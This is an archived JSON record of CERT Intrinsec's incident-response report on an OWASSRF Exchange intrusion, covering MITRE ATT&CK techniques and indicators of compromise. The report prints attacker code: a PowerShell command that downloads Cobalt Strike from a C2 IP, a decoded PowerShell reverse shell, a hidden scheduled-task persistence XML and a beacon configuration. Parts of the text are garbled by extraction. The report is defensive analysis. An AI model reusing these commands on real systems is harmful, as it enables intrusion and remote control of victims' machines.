{
    "id": "c2504596-cf11-43f0-95b0-938fdd558bbf",
    "created_at": "2023-04-05T02:08:43.857506Z",
    "updated_at": "2025-03-27T02:09:18.137945Z",
    "deleted_at": null,
    "sha1_hash": "fa3adc54ae9b82616b4746e15b983e3f1300789d",
    "title": "2023-01-16 - ProxyNotShell – OWASSRF – Merry Xchange",
    "authors": "",
    "file_creation_date": "2023-04-03T08:25:41Z",
    "file_modification_date": "2023-04-03T08:25:41Z",
    "file_size": 451372,
    "plain_text": "# ProxyNotShell – OWASSRF – Merry Xchange\n\n**intrinsec.com/proxynotshell-owassrf-merry-xchange/**\n\nEquipe CERT 16 janvier 2023\n\n## Context\n\nBy the end of 2022, CERT Intrinsec dealt with the newly discovered bypass of ProxyNotShell named OWASSRF. This article details the\nmodus operandi of a threat actor that exploited this vulnerability. On day one, the attackers leveraged vulnerable Exchange servers and\nexploited ProxyNotShell vulnerabilities to gain access to the information system. Next following days, they used remote access tools, dropped\ncommodity malwares, created a local administrator account and removed evidences. They dropped Cobalt Strike payloads and dumped\ncredentials. By the end of the third day of the intrusion, the emergency procedure is activated to contain and stop the attack, prior to calling\nCERT Intrinsec.\n\n## CERT Intrinsec presentation\n\nCERT Intrinsec is a French incident response team that performs its operation mainly on the France’s sector. The team deals with about 50\nmajor incidents per year and works to help its customers to recover from cyber-attacks and strengthen their security. Since 2017, CERT\nIntrinsec has responded to hundreds of security breaches involving companies and public entities. The majority of those incidents are related\nto cybercriminality and ransomware attacks with financial objectives, hence, CERT Intrinsec follows those groups activities and generates\ncomprehensive intelligence from the field. ANSSI (French National Security Agency) granted CERT Intrinsec PRIS (State-Certified Security\nIncident Response Service Providers) certification. The latter testify that CERT Intrinsec meets specific incident response requirements, using\ndedicated procedures, qualified people and appropriate infrastructures.\n\n## OWASSRF\n\nOWASSRF consists of two vulnerabilities affecting Windows Exchange 2013, 2016 and 2019 : CVE-2022-41080 and CVE-2022-41082. The\nfirst one exploits Microsoft URL normalization process to access to backend URLs as NT AUTHORITY/SYSTEM (using Server Side Request\nForgery). The second one allows remote code execution when PowerShell is accessible.\n\n## Tactics, techniques and Procedures\n\nFollowing sections give an insight into techniques, tactics and procedures, mapped to the MITRE ATT&CK.\n\n### Initial Access\n\nTactic ID Technique ID Technique Name\n\nInitial Access T1190 Exploit Public-Facing Application\n\nAttackers exploited vulnerabilities CVE-2022-41080 and CVE-2022-41082 affecting Microsoft Exchange servers. CERT Intrinsec discovered\n[two IP addresses reported by Rapid7 as ProxyNotShell indicators of compromise : 45.76.141[.]84 and 45.76.143[.]143. Those IP addresses](https://www.rapid7.com/blog/post/2022/12/21/cve-2022-41080-cve-2022-41082-rapid7-observed-exploitation-of-owassrf-in-exchange-for-rce/)\nwere used as SystemBC command and control servers.\n\n### Execution\n\nOnce entered the information system, attackers executed command using PowerShell to download Cobalt Strike beacons and run malicious\nbase64 payloads.\n\nThe following PowerShell command was used to download asas file which was identified as a Cobalt Strike payload allowing the threat actor to\nsend remote command to infected devices.\n\npowershell.exe –nop –w hidden –c IEX ((new-object net.webclient).downloadstring(‘hxxp[://]209.127.27[.]17:80/asas’))\n\nAttackers used PowerShell as well to connect from compromised equipments to command and control servers.\n\niex([sySteM.tEXT.encoDing]::uTF8.gEtSTrING([SYSTeM.cOnVeRt]::FrOmBASE64StrING(‘[base64 payload]‘)));exit\n\nThe base64 payload in the previous iex command is reported below. Its goal is to connect to a remote host, and to read and write data from\nthis host. 0x2d4c8d54 is the encoded representation of 45.76.141[.]84 IP address.\n\ndo {\n\nStart-Sleep -Seconds 1\n\ntry{\n\n\n-----\n\n$tCC e Object SoC e s CpC t( 0 d c8d5, 3)\n} catch {}\n\n} until ($tCC.Connected)\n\n$ns = $tCC.GetStream()\n\n$SW = New-Object Io.sTrEamWriTer($ns)\n\nfunction WriteToStream ($STrinG) {\n\ntry{\n\n[byte[]]$scRIpt:Buffer = 0..$tCC.ReceiveBufferSize | % {0}\n\n$SW.Write($STrinG + ‘SL> ‘)\n\n$SW.Flush()\n\n} catch {}\n\n}\nWriteToStream »\n\nwhile(($ByTESReaD = $ns.Read($bufFER, 0, $bufFER.Length)) -gt 0) {\n\n$c = ([TEXt.enCOdiNG]::UTF8).GetString($bufFER, 0, $ByTESReaD – 1)\n\n$O= try {\n\nInvoke-Expression $c 2>&1 | Out-String\n\n} catch {\n\n$_ | Out-String\n\n}\nWriteToStream ($O)\n\n}\n$SW.Close()\n\nThreat actor also executes PsExec as well to send commands to equipments, using services.\n\nTactic ID Technique ID Technique Name\n\nPersistence T1053.005 Scheduled Task\n\nPersistence T1136.001 Create Account: Local Account\n\nTo ensure persistence, attackers created a local administrator account named Admon on the Exchange server. They then used this account in\na scheduled task to execute a SystemBC binary C:\\Users\\Public\\Music\\svhost.exe, as shown below:\n\n<?xml version= »1.0″ encoding= »UTF-16″?>\n\n<Task version= »1.1″ xmlns= »http://schemas.microsoft.com/windows/2004/02/mit/task »>\n\n<RegistrationInfo>\n\n<Author>[HOSTNAME]\\Admon</Author>\n\n</RegistrationInfo>\n\n<Triggers>\n\n<TimeTrigger>\n\n<Enabled>true</Enabled>\n\n<Repetition>\n\n<Interval>PT2M</Interval>\n\n<Duration>P365D</Duration>\n\n<StopAtDurationEnd>false</StopAtDurationEnd>\n\n</Repetition>\n\n<StartBoundary>[DATE]</StartBoundary>\n\n</TimeTrigger>\n\n</Triggers>\n\n<Settings>\n\n<Enabled>true</Enabled>\n\n<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>\n\n<ExecutionTimeLimit>P41DT15H</ExecutionTimeLimit>\n\n<Hidden>true</Hidden>\n\n<WakeToRun>false</WakeToRun>\n\n<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n\n<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n\n<RunOnlyIfIdle>false</RunOnlyIfIdle>\n\n<Priority>5</Priority>\n\n\n-----\n\nd eSett gs\n<Duration>PT10M</Duration>\n\n<WaitTimeout>PT1H</WaitTimeout>\n\n<StopOnIdleEnd>false</StopOnIdleEnd>\n\n<RestartOnIdle>false</RestartOnIdle>\n\n</IdleSettings>\n\n</Settings>\n\n<Principals>\n\n<Principal id= »Author »>\n\n<UserId>System</UserId>\n\n<RunLevel>HighestAvailable</RunLevel>\n\n<LogonType>InteractiveTokenOrPassword</LogonType>\n\n</Principal>\n\n</Principals>\n\n<Actions Context= »Author »>\n\n<Exec>\n\n<Command>C:\\Users\\Public\\Music\\svhost.exe</Command>\n\n<Arguments>start</Arguments>\n\n</Exec>\n\n</Actions>\n\n</Task>\n\n### Privilege Escalation\n\nTactic ID Technique ID Technique Name\n\nPrivilege Escalation T1078.002 Valid Account: Domain Account\n\nAfter exploiting ProxyNotShell vulnerability and getting into Exchange server, attackers compromised a legitimate administrator account that\nmade their actions easier.\n\n### Defense Evasion\n\nTactic ID Technique ID Technique Name\n\nDefense Evasion T1562.001 Disable or Modify Tools\n\nDefense Evasion T1070.001 Clear Windows Event Logs\n\nDefense Evasion T1070 Indicator Removal on Host\n\nDefense Evasion T1036.005 Match Legitimate Name or Location\n\nMultiple defense evasion techniques were leveraged to avoid detection and slow down investigations. First, System and Windows PowerShell\nevent log files were removed to hide traces from analysts (104 Windows event ID). Besides, RDP RestrictedAdmin feature was disabled. They\ntried to hide in plain sight by approximating svchost.exe to name their malwares (svhost.exe, svchosts.exe etc) and also deleted many of their\ntools from infected systems.\n\n### Credential Access\n\nTactic ID Technique ID Technique Name\n\nCredential Access T1003.001 LSASS Memory\n\nAttacker used the built-in task manager application in order to dump LSASS process memory. Several Windows event logs (4688 Windows\nevent ID) were identified during the investigation, an explorer.exe parent process running a C:\\Windows\\System32\\Taskmgr.exe process with\nan abnormal account.\n\nA few moment later, the file C:\\Users\\[USER]\\AppData\\Local\\Temp\\lsass.DMP was identified on the filesystem.\n\n\n-----\n\n### Lateral Movement\n\nTactic ID Technique ID Technique Name\n\nLateral Movement T1021.001 Remote Services: Remote Desktop Protocol\n\nLateral Movement T1570 Remote Services: Lateral Tool Transfert\n\nAttackers used Remote Desktop Protocol to move laterally from compromised Exchange servers to other devices such as domain controller or\nprinting server. They tried as well to copy commodity malwares and post-exploitation tools on several equipments but were blocked by security\nsolutions.\n\n### Collection\n\nTactic ID Technique ID Technique Name\n\nCollection T1560.001 Archive Collected Data: Archive via Utility\n\nCollection T1005 Data from Local System\n\nAttackers created a zip file (lsass.zip) containing LSASS process dump (lsass.DMP) in C:\\Users\\[USER]\\AppData\\Local\\Temp\\. Few minutes\nafter zip file creation, both lsass.DMP and lsass.zip were deleted from system.\n\n### Command and Control\n\nTactic ID Technique ID Technique Name\n\nCommand and Control T1071.001 Web Protocols\n\nCommand and Control T1105 Ingress Tool Transfer\n\nCommand and Control T1572 Protocol Tunneling\n\nForensic investigation leds CERT Intrinsec to collect several malwares used to execute remote commands including a CobaltStrike payload.\nThis payload is downloaded via a PowerShell command from the hosting server 209.127.27[.]17 and dropped on the infected host in the file\n**C:\\PerfLogs\\svchosts.exe. The binary communicates with its Command & Control server arcacontals[.]com and with other infected hosts**\nwith the Named Pipe \\Device\\NamedPipe\\MSSE-1806-server.\n\n\n-----\n\nThe full configuration has been extracted below with CobaltStrikeParser (https://github.com/Sentinel-One/CobaltStrikeParser):\n\nBeaconType            – HTTPS\n\nPort               – 443\n\nSleepTime            – 97907\n\nMaxGetSize            – 2098999\n\nJitter              – 36\n\nMaxDNS              – Not Found\n\nPublicKey_MD5          – 30b36f36546ab96c82b296ad6761d624\n\nC2Server             – arcacontals[.]com,/accelerate/mailbox/USVLD2RM\n\nUserAgent            – Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0\n\nHttpPostUri           – /communicate/build/LPK4HR7G\n\nMalleable_C2_Instructions    – Remove 910 bytes from the end\n\nRemove 929 bytes from the beginning\n\nNetBIOS decode ‘a’\n\nXOR mask w/ random key\n\nHttpGet_Metadata         – ConstHeaders\n\nAccept: application/json, text/html, application/xhtml+xml\n\nAccept-Language: en-us\n\nAccept-Encoding: compress, br\nMetadata\n\nmask\n\nnetbiosu\n\nprepend « 89K_62QIZTU2PUB2EVL0VMSLA2SCBSCKHQ1E= »\n\nheader « Cookie »\n\nHttpPost_Metadata        – ConstHeaders\n\nAccept: text/html, application/xhtml+xml, application/json\n\nAccept-Language: ar-dz\n\nAccept-Encoding: *, gzip\nSessionId\n\nmask\n\nnetbios\n\nparameter « _VMYKCXYW »\n\nOutput\n\nmask\n\nnetbios\n\nprint\n\nPipeName             – Not Found\n\nDNS_Idle             – Not Found\n\nDNS_Sleep            – Not Found\nSSH_Host             – Not Found\n\nSSH_Port             – Not Found\n\n\n-----\n\nSS _Use a e ot ou d\nSSH_Password_Plaintext      – Not Found\n\nSSH_Password_Pubkey       – Not Found\n\nSSH_Banner            –\n\nHttpGet_Verb           – GET\n\nHttpPost_Verb          – POST\n\nHttpPostChunk          – 0\n\nSpawnto_x86           – %windir%\\syswow64\\dns-sd.exe\n\nSpawnto_x64           – %windir%\\sysnative\\EhStorAuthn.exe\n\nCryptoScheme           – 0\n\nProxy_Config           – Not Found\n\nProxy_User            – Not Found\n\nProxy_Password          – Not Found\n\nProxy_Behavior          – Use IE settings\nWatermark_Hash          – xi1knfb/QiftN2EAhdtcyw==\n\nWatermark            – 206546002\n\nbStageCleanup          – True\n\nbCFGCaution           – False\n\nKillDate             – 0\n\nbProcInject_StartRWX       – False\n\nbProcInject_UseRWX        – False\n\nbProcInject_MinAllocSize     – 7400\n\nProcInject_PrependAppend_x86   –\nb’f\\x90f\\x0f\\x1fD\\x00\\x00\\x0f\\x1f\\x84\\x00\\x00\\x00\\x00\\x00\\x0f\\x1fD\\x00\\x00PX\\x0f\\x1f\\x00\\x0f\\x1f\\x80\\x00\\x00\\x00\\x00f\\x90′\n\nb’\\x0f\\x1f\\x84\\x00\\x00\\x00\\x00\\x00f\\x0f\\x1fD\\x00\\x00\\x90\\x0f\\x1fD\\x00\\x00\\x90f\\x0f\\x1f\\x84\\x00\\x00\\x00\\x00\\x00\\x0f\\x1f\\x00f\\x0f\\x1f\\x84\\x00\\x00\\x\nProcInject_PrependAppend_x64   –\nb’\\x0f\\x1f\\x84\\x00\\x00\\x00\\x00\\x00f\\x0f\\x1fD\\x00\\x00f\\x0f\\x1f\\x84\\x00\\x00\\x00\\x00\\x00f\\x90\\x0f\\x1fD\\x00\\x00\\x0f\\x1f\\x84\\x00\\x00\\x00\\x00\\x00\\x0f\\x\n\nb’\\x0f\\x1f@\\x00f\\x0f\\x1f\\x84\\x00\\x00\\x00\\x00\\x00\\x0f\\x1f\\x00\\x0f\\x1f@\\x00f\\x0f\\x1f\\x84\\x00\\x00\\x00\\x00\\x00f\\x0f\\x1fD\\x00\\x00\\x90\\x0f\\x1f\\x80\\x00\nProcInject_Execute        – ntdll:RtlUserThreadStart\n\nCreateThread\n\nNtQueueApcThread-s\n\nCreateRemoteThread\n\nRtlCreateUserThread\n\nProcInject_AllocationMethod   – NtMapViewOfSection\n\nbUsesCookies           – True\n\nHostHeader            –\n\nheadersToRemove         – Not Found\n\nDNS_Beaconing          – Not Found\n\nDNS_get_TypeA          – Not Found\n\nDNS_get_TypeAAAA         – Not Found\n\nDNS_get_TypeTXT         – Not Found\n\nDNS_put_metadata         – Not Found\n\nDNS_put_output          – Not Found\n\nDNS_resolver           – Not Found\n\nDNS_strategy           – round-robin\n\nDNS_strategy_rotate_seconds   – -1\n\nDNS_strategy_fail_x       – -1\n\nDNS_strategy_fail_seconds    – -1\n\nRetry_Max_Attempts        – 0\n\nRetry_Increase_Attempts     – 0\n\nRetry_Duration          – 0\n\nAttacker also deployed on compromised hosts a proxy SOCKS5 malware named SystemBC.\n\n\n-----\n\nOthers remote administration tools has been found during the investigation from hosting servers 45.77.154[.]115 and 45.76.62[.]11 but they\nhave not been used by the attacker:\n\nURL Type\n\nhxxp[://]45.77.154[.]115/plink.exe Plink\n\nhxxp[://]45.76.62[.]11/AnyDesk.exe AnyDesk\n\nhxxp[://]45.76.62[.]11/dwagent.exe DWService\n\n## Indicators of compromise\n\n### Network indicators\n\nIP Type Commentaire\n\n104.21.9[.]61 ip Cobalt Strike C2\n\n209.127.27[.]17 ip Cobalt Strike C2\n\n146.70.53[.]169 ip SystemBC C2\n\n45.76.137[.]242 ip SystemBC C2\n\n45.76.141[.]84 ip SystemBC C2\n\n45.76.143[.]143 ip SystemBC C2 (OSINT)\n\n45.76.62[.]11 ip Server hosting malicious payloads\n\n45.77.154[.]115 ip Server hosting malicious payloads\n\narcacontals[.]com domain Cobalt Strike C2\n\n\n-----\n\nIP Type Commentaire\n\nhxxps[://]arcacontals[.]com/accelerate/mailbox/USVLD2RM url Cobalt Strike C2\n\nhxxp[://]209.127.27[.]17/asas url Cobalt Strike\n\nhxxp[://]45.76.62[.]11/AnyDesk.exe url AnyDesk tool\n\nhxxp[://]45.76.62[.]11/dwagent.exe url Remote Administration Tool\n\nhxxp[://]45.77.154[.]115/host.sa url SystemBC\n\nhxxp[://]45.77.154[.]115/plink.exe url Plink tool\n\n### System indicators\n\nBinaire Taille SHA1 Commentaire\n\nAnyDesk.exe 3999808 665cad3ed21f6443d1adacf18ca45dfaa8f52c99 AnyDesk\n\nGRB_NET.exe 179712 3878917397c055dcd0999ac681c9c7a83cba0f78 Unidentified\n\nasas 229880 35acb5c8357e2272ebf40bc37881aa0e2c55e2f7 CobaltStrike\n\nsvchosts.exe 284.67 Kb 76d76089bb9b67766763d952b3d5138862b1a31e CobaltStrike\n\ndwagent.exe 13524832 a7bf900650dc8cb992b9db5dd496245817d3a5d9 DWAgent\n\nsvhost.dll 694272 7d8a18b44d417f2710ab00e58dc2db177804f508 SystemBC\n\nsvhost.exe 13824 704b9b6e1e9af746b643a2c20ae89427007b289a SystemBC\n\npa.exe 837936 447d6a5ed041ace4541a182006b02dcc4ba2e740 Plink\n\n## Sources\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-01-16 - ProxyNotShell – OWASSRF – Merry Xchange.pdf"
    ],
    "report_names": [
        "2023-01-16 - ProxyNotShell – OWASSRF – Merry Xchange.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1680660523,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1680510341,
    "ts_modification_date": 1680510341,
    "files": {
        "pdf": "https://archive.orkl.eu/fa3adc54ae9b82616b4746e15b983e3f1300789d.pdf",
        "text": "https://archive.orkl.eu/fa3adc54ae9b82616b4746e15b983e3f1300789d.txt",
        "img": "https://archive.orkl.eu/fa3adc54ae9b82616b4746e15b983e3f1300789d.jpg"
    }
}